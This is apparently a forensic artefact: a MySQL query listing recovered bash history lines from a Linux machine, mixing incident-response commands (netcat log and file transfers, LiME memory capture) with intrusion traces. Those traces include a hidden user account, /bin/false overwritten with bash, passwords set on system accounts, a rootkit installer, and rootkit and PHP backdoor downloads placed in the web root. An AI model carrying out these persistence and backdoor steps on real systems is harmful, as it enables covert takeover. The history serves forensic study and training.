mysql> select * from histories order by recno;
+---------------------------+--------------------------------------------------------------------------------------------------------------------------------------------+-------+
| historyFilename           | historyCommand                                                                                                                             | recno |
| home/john/.bash_history   | date | nc 192.168.56.1 9999                                                                                                                |  1089 |
| home/john/.bash_history   | uname -a | nc 192.168.56.1 9999                                                                                                            |  1090 |
| home/john/.bash_history   | cd                                                                                                                                         |  1091 |
| home/john/.bash_history   | cd /bin                                                                                                                                    |  1092 |
| home/john/.bash_history   | nc 192.168.56.1 4444 < /bin/bash                                                                                                           |  1093 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |  1094 |
| home/john/.bash_history   | cd x64                                                                                                                                     |  1095 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |  1096 |
| home/john/.bash_history   | export PATH=/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/bin:/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/sbin             |  1097 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/lib64:/media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/lib |  1098 |
| home/john/.bash_history   | ifconfig                                                                                                                                   |  1099 |
| home/john/.bash_history   | cd/                                                                                                                                        |  1100 |
| home/john/.bash_history   | cd                                                                                                                                         |  1101 |
| home/john/.bash_history   | date | nc 192.168.56.1 9999                                                                                                                |  1102 |
| home/john/.bash_history   | uname -a | nc 192.168.56.1 9999                                                                                                            |  1103 |
| home/john/.bash_history   | nc 192.168.56.1 4444 < /bin/bash                                                                                                           |  1104 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/                                                                                       |  1105 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |  1106 |
| home/john/.bash_history   | ls                                                                                                                                         |  1107 |
| home/john/.bash_history   | ls /mnt                                                                                                                                    |  1108 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/                                                                                       |  1109 |
| home/john/.bash_history   | cd x64/                                                                                                                                    |  1110 |
| home/john/.bash_history   | ls                                                                                                                                         |  1111 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |  1112 |
| home/john/.bash_history   | export PATH=$(pwd)/bin:$(pwd)/sbin                                                                                                         |  1113 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=$(pwd)/lib64:$(pwd)/lib                                                                                             |  1114 |
| home/john/.bash_history   | ifconfig                                                                                                                                   |  1115 |
| home/john/.bash_history   | echo $PATH                                                                                                                                 |  1116 |
| home/john/.bash_history   | source bin/setup-client.sh 192.168.56.1                                                                                                    |  1117 |
| home/john/.bash_history   | bash bin/send-log.sh date                                                                                                                  |  1118 |
| home/john/.bash_history   | bash bin/send-log.sh ifconfig                                                                                                              |  1119 |
| home/john/.bash_history   | bash bin/send-log.sh ps -ef                                                                                                                |  1120 |
| home/john/.bash_history   | bash bin/send-log.sh ps -ef lsof                                                                                                           |  1121 |
| home/john/.bash_history   | bash bin/send-log.sh lsof                                                                                                                  |  1122 |
| home/john/.bash_history   | bash bin/send-log.sh route                                                                                                                 |  1123 |
| home/john/.bash_history   | bash bin/send-log.sh netstat                                                                                                               |  1124 |
| home/john/.bash_history   | bash bin/send-file.sh /bin/bash                                                                                                            |  1125 |
| home/john/.bash_history   | /usr/bin/lsof                                                                                                                              |  1126 |
| home/john/.bash_history   | cd bin                                                                                                                                     |  1127 |
| home/john/.bash_history   | ls                                                                                                                                         |  1128 |
| home/john/.bash_history   | cp /usr/bin/lsof ./.                                                                                                                       |  1129 |
| home/john/.bash_history   | cp /usr/bin/basename ./.                                                                                                                   |  1130 |
| home/john/.bash_history   | ls                                                                                                                                         |  1131 |
| home/john/.bash_history   | cd ..                                                                                                                                      |  1132 |
| home/john/.bash_history   | bash bin/send-file.sh /bin/bash                                                                                                            |  1133 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/                                                                                       |  1134 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |  1135 |
| home/john/.bash_history   | cd x64                                                                                                                                     |  1136 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |  1137 |
| home/john/.bash_history   | export PATH=$(pwd)/bin:$(pwd)/sbin                                                                                                         |  1138 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=$(pwd)/lib64:$(pwd)/lib                                                                                             |  1139 |
| home/john/.bash_history   | source bin/setup-client.sh 192.168.56.1                                                                                                    |  1140 |
| home/john/.bash_history   | bash bin/send-log.sh date                                                                                                                  |  1141 |
| home/john/.bash_history   | bash bin/send-log.sh ifconfig                                                                                                              |  1142 |
| home/john/.bash_history   | bash bin/send-log.sh netstat                                                                                                               |  1143 |
| home/john/.bash_history   | bash bin/send-log.sh lsof                                                                                                                  |  1144 |
| home/john/.bash_history   | bash bin/send-file.sh /bin/bash                                                                                                            |  1145 |
| home/john/.bash_history   | bash bin/send-file.sh /bin/false                                                                                                           |  1146 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |  1147 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/                                                                                   |  1148 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |  1149 |
| home/john/.bash_history   | export PATH=$(pwd)/bin:$(pwd)/sbin                                                                                                         |  1150 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=$(pwd)/lib64:$(pwd)/lib                                                                                             |  1151 |
| home/john/.bash_history   | source bin/setup-client.sh 192.168.56.1                                                                                                    |  1152 |
| home/john/.bash_history   | bash bin/inital-scan.sh                                                                                                                    |  1153 |
| home/john/.bash_history   | bash bin/initial-scan.sh                                                                                                                   |  1154 |
| home/john/.bash_history   | cd                                                                                                                                         |  1155 |
| home/john/.bash_history   | mount                                                                                                                                      |  1156 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/                                                                                   |  1157 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |  1158 |
| home/john/.bash_history   | w                                                                                                                                          |  1159 |
| home/john/.bash_history   | useradd johnn                                                                                                                              |  1160 |
| home/john/.bash_history   | userdel johnn                                                                                                                              |  1161 |
| home/john/.bash_history   | adduser johnn                                                                                                                              |  1162 |
| home/john/.bash_history   | cp /bin/true /bin/false                                                                                                                    |  1163 |
| home/john/.bash_history   | ls -l /bin/false                                                                                                                           |  1164 |
| home/john/.bash_history   | passwd whoopsie                                                                                                                            |  1165 |
| home/john/.bash_history   | passwd lightdm                                                                                                                             |  1166 |
| home/john/.bash_history   | cp /bin/bash /bin/false                                                                                                                    |  1167 |
| home/john/.bash_history   | vi /etc/gr/group                                                                                                                           |  1168 |
| home/john/.bash_history   | vi /etc/groups                                                                                                                             |  1169 |
| home/john/.bash_history   | cd /etc                                                                                                                                    |  1170 |
| home/john/.bash_history   | ls gr*                                                                                                                                     |  1171 |
| home/john/.bash_history   | cat passwd                                                                                                                                 |  1172 |
| home/john/.bash_history   | cd /home                                                                                                                                   |  1173 |
| home/john/.bash_history   | ls                                                                                                                                         |  1174 |
| home/john/.bash_history   | mv johnn .johnn                                                                                                                            |  1175 |
| home/john/.bash_history   | ls                                                                                                                                         |  1176 |
| home/john/.bash_history   | ls -l                                                                                                                                      |  1177 |
| home/john/.bash_history   | vi /etc/passwd                                                                                                                             |  1178 |
| home/john/.bash_history   | man sed                                                                                                                                    |  1179 |
| home/john/.bash_history   | sed #/home/johnn#/home/.johnn# /etc/passwd                                                                                                 |  1180 |
| home/john/.bash_history   | sed -i 's#/home/johnn#/home/.johnn#' /etc/passwd                                                                                           |  1181 |
| home/john/.bash_history   | tail /etc/passwd                                                                                                                           |  1182 |
| home/john/.bash_history   | ./install                                                                                                                                  |  1183 |
| home/john/.bash_history   | nmap localhost                                                                                                                             |  1184 |
| home/john/.bash_history   | cd ..                                                                                                                                      |  1185 |
| home/john/.bash_history   | ls                                                                                                                                         |  1186 |
| home/john/.bash_history   | pwd                                                                                                                                        |  1187 |
| home/john/.bash_history   | ls                                                                                                                                         |  1188 |
| home/john/.bash_history   | ls -a                                                                                                                                      |  1189 |
| home/john/.bash_history   | cd ..                                                                                                                                      |  1190 |
| home/john/.bash_history   | pwd                                                                                                                                        |  1191 |
| home/john/.bash_history   | cd Downloads/                                                                                                                              |  1192 |
| home/john/.bash_history   | ls                                                                                                                                         |  1193 |
| home/john/.bash_history   | cd ..                                                                                                                                      |  1194 |
| home/john/.bash_history   | cd /home                                                                                                                                   |  1195 |
| home/john/.bash_history   | ls                                                                                                                                         |  1196 |
| home/john/.bash_history   | ls -a                                                                                                                                      |  1197 |
| home/john/.bash_history   | clear                                                                                                                                      |  1198 |
| home/john/.bash_history   | ls                                                                                                                                         |  1199 |
| home/john/.bash_history   | cd Downloads/                                                                                                                              |  1200 |
| home/john/.bash_history   | ls                                                                                                                                         |  1201 |
| home/john/.bash_history   | cd xingyiquan/                                                                                                                             |  1202 |
| home/john/.bash_history   | ls                                                                                                                                         |  1203 |
| home/john/.bash_history   | more README                                                                                                                                |  1204 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |  1205 |
| home/john/.bash_history   | ls                                                                                                                                         |  1206 |
| home/john/.bash_history   | cd ..                                                                                                                                      |  1207 |
| home/john/.bash_history   | ls                                                                                                                                         |  1208 |
| home/john/.bash_history   | nmap localhost                                                                                                                             |  1209 |
| home/john/.bash_history   | q                                                                                                                                          |  1210 |
| home/john/.bash_history   | export PATH=$(pwd)/sbin:$(pwd)/bin                                                                                                         |  1211 |
| home/john/.bash_history   | export LD_LIBRARY_PATH=$(pwd)/lib64:$(pwd)/lib                                                                                             |  1212 |
| home/john/.bash_history   | source bin/setup-client.sh 192.168.56.1                                                                                                    |  1213 |
| home/john/.bash_history   | bash bin/initial-scan.sh                                                                                                                   |  1214 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |  1215 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/                                                                                   |  1216 |
| home/john/.bash_history   | exec bin/bash                                                                                                                              |  1217 |
| home/john/.bash_history   | ls                                                                                                                                         |  1218 |
| home/john/.bash_history   | make                                                                                                                                       |  1219 |
| home/john/.bash_history   | cp lime-3.16.0-30-generic.ko ../../.                                                                                                       |  1220 |
| home/john/.bash_history   | cd ../..                                                                                                                                   |  1221 |
| home/john/.bash_history   | ls                                                                                                                                         |  1222 |
| home/john/.bash_history   | insmod lime-3.16.0-30-generic.ko "path=tcp:4444 format=lime"                                                                               |  1223 |
| home/john/.bash_history   | ls                                                                                                                                         |  1224 |
| home/john/.bash_history   | uname -a                                                                                                                                   |  1225 |
| home/john/.bash_history   | insmod lime-3.16.0-30-generic.ko "path=tcp:4444 format=lime"                                                                               |  1226 |
| home/john/.bash_history   | delmod lime-3.16.0-30-generic                                                                                                              |  1227 |
| home/john/.bash_history   | modprobe -r lime-3.16.0-30-generic                                                                                                         |  1228 |
| home/john/.bash_history   | lsmod | grep lime                                                                                                                          |  1229 |
| home/john/.bash_history   | modprobe -r lime                                                                                                                           |  1230 |
| home/john/.bash_history   | lsmod | grep lime                                                                                                                          |  1231 |
| home/john/.bash_history   | lsmod                                                                                                                                      |  1232 |
| home/john/.bash_history   | exit                                                                                                                                       |  1233 |
| home/john/.bash_history   | uname -a                                                                                                                                   |  1234 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/                                                                                       |  1235 |
| home/john/.bash_history   | ls                                                                                                                                         |  1236 |
| home/john/.bash_history   | cd x64/                                                                                                                                    |  1237 |
| home/john/.bash_history   | ls                                                                                                                                         |  1238 |
| home/john/.bash_history   | cd LiMe                                                                                                                                    |  1239 |
| home/john/.bash_history   | ls                                                                                                                                         |  1240 |
| home/john/.bash_history   | cd src                                                                                                                                     |  1241 |
| home/john/.bash_history   | ls -l                                                                                                                                      |  1242 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |  1243 |
| home/john/.bash_history   | cd /media/john/37fd0119-0386-4b6e-896b-d463f702f660/x64/                                                                                   |  1244 |
| home/john/.bash_history   | ls                                                                                                                                         |  1245 |
| home/john/.bash_history   | ls                                                                                                                                         |  1246 |
| home/john/.bash_history   | uname -a                                                                                                                                   |  1247 |
| home/john/.bash_history   | insmod lime-3.16.0-30-generic.ko "path=tcp:4444 format=lime"                                                                               |  1248 |
| home/john/.bash_history   | cd /lib/modules                                                                                                                            |  1249 |
| home/john/.bash_history   | ls                                                                                                                                         |  1250 |
| home/john/.bash_history   | cd 3.16.0-30-generic/                                                                                                                      |  1251 |
| home/john/.bash_history   | ls                                                                                                                                         |  1252 |
| home/john/.bash_history   | cd build                                                                                                                                   |  1253 |
| home/john/.bash_history   | ls                                                                                                                                         |  1254 |
| home/john/.bash_history   | cd ..                                                                                                                                      |  1255 |
| home/john/.bash_history   | ls                                                                                                                                         |  1256 |
| home/john/.bash_history   | cd ..                                                                                                                                      |  1257 |
| home/john/.bash_history   | ls                                                                                                                                         |  1258 |
| home/john/.bash_history   | cd Downloads/                                                                                                                              |  1259 |
| home/john/.bash_history   | ls                                                                                                                                         |  1260 |
| home/john/.bash_history   | cd xingyiquan/                                                                                                                             |  1261 |
| home/john/.bash_history   | ls                                                                                                                                         |  1262 |
| home/john/.bash_history   | sudo ./install                                                                                                                             |  1263 |
| home/john/.bash_history   | ls                                                                                                                                         |  1264 |
| home/john/.bash_history   | cd ..                                                                                                                                      |  1265 |
| home/john/.bash_history   | ls                                                                                                                                         |  1266 |
| home/john/.bash_history   | cd ..                                                                                                                                      |  1267 |
| home/john/.bash_history   | sudo -s                                                                                                                                    |  1268 |
| home/john/.bash_history   | sudo su -                                                                                                                                  |  1269 |
| home/john/.bash_history   | ls                                                                                                                                         |  1270 |
| home/john/.bash_history   | uname -a                                                                                                                                   |  1271 |
| home/john/.bash_history   | ifconfig                                                                                                                                   |  1272 |
| home/john/.bash_history   | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |  1273 |
| home/john/.bash_history   | sudo su -                                                                                                                                  |  1274 |
| home/.johnn/.bash_history | w                                                                                                                                          |  1275 |
| home/.johnn/.bash_history | cat /etc/passwd                                                                                                                            |  1276 |
| home/.johnn/.bash_history | su whoopsie                                                                                                                                |  1277 |
| home/.johnn/.bash_history | su lightdm                                                                                                                                 |  1278 |
| root/.bash_history        | fdisk -l                                                                                                                                   |  1279 |
| root/.bash_history        | mkdir /mnt/good-bins                                                                                                                       |  1280 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |  1281 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |  1282 |
| root/.bash_history        | exec bin/bash                                                                                                                              |  1283 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |  1284 |
| root/.bash_history        | ls                                                                                                                                         |  1285 |
| root/.bash_history        | ls -al                                                                                                                                     |  1286 |
| root/.bash_history        | cd /mnt/good-bins/scripts                                                                                                                  |  1287 |
| root/.bash_history        | fdisk -l                                                                                                                                   |  1288 |
| root/.bash_history        | mkdir /mnt/good-bins                                                                                                                       |  1289 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |  1290 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |  1291 |
| root/.bash_history        | exec bin/bash                                                                                                                              |  1292 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |  1293 |
| root/.bash_history        | cd/mnt/good-bins                                                                                                                           |  1294 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |  1295 |
| root/.bash_history        | ls                                                                                                                                         |  1296 |
| root/.bash_history        | exec bin/bash                                                                                                                              |  1297 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |  1298 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |  1299 |
| root/.bash_history        | exec bin/bash                                                                                                                              |  1300 |
| root/.bash_history        | mdkir /mnt/good-bins                                                                                                                       |  1301 |
| root/.bash_history        | mkdir /mnt/good-bins                                                                                                                       |  1302 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |  1303 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |  1304 |
| root/.bash_history        | exec bin/bash                                                                                                                              |  1305 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |  1306 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |  1307 |
| root/.bash_history        | exec bin/bash                                                                                                                              |  1308 |
| root/.bash_history        | source scripts/setup-client.sh                                                                                                             |  1309 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |  1310 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |  1311 |
| root/.bash_history        | exec bin/bash                                                                                                                              |  1312 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |  1313 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |  1314 |
| root/.bash_history        | exec bin/bash                                                                                                                              |  1315 |
| root/.bash_history        | mount -t ext4 /dev/sdb1 /mnt/good-bins                                                                                                     |  1316 |
| root/.bash_history        | cd /mnt/good-bins                                                                                                                          |  1317 |
| root/.bash_history        | exec bin/bash                                                                                                                              |  1318 |
| root/.bash_history        | source scripts/setup-client.sh 10.0.2.2                                                                                                    |  1319 |
| root/.bash_history        | cd scripts                                                                                                                                 |  1320 |
| root/.bash_history        | ./initial-scan.sh                                                                                                                          |  1321 |
| root/.bash_history        | ./send-file.sh /bin/bash                                                                                                                   |  1322 |
| root/.bash_history        | ./send-file.sh /bin/false                                                                                                                  |  1323 |
| home/john/.bash_history   | useradd --help                                                                                                                             |  1534 |
| home/john/.bash_history   | adduser --help                                                                                                                             |  1535 |
| home/john/.bash_history   | adduser mysqll                                                                                                                             |  1536 |
| home/john/.bash_history   | vi /etc/passwd                                                                                                                             |  1537 |
| home/john/.bash_history   | cd /tmp                                                                                                                                    |  1538 |
| home/john/.bash_history   | wget http://dl.packetstormsecurity.net/UNIX/penetration/rootkits/poison.zip                                                                |  1539 |
| home/john/.bash_history   | unzip poison.zip                                                                                                                           |  1540 |
| home/john/.bash_history   | ls                                                                                                                                         |  1541 |
| home/john/.bash_history   | mv poison.php /var/www/html/index2.php                                                                                                     |  1542 |
| home/john/.bash_history   | ls                                                                                                                                         |  1543 |
| home/john/.bash_history   | rm pois*                                                                                                                                   |  1544 |
| home/john/.bash_history   | ls                                                                                                                                         |  1545 |
| home/john/.bash_history   | wget http://dl.packetstormsecurity.net/UNIX/penetration/rootkits/rk.tgz                                                                    |  1546 |
| home/john/.bash_history   | ls                                                                                                                                         |  1547 |
| home/john/.bash_history   | tar xavf rk.tgz                                                                                                                            |  1548 |
| home/john/.bash_history   | ls                                                                                                                                         |  1549 |
| home/john/.bash_history   | cd rk                                                                                                                                      |  1550 |
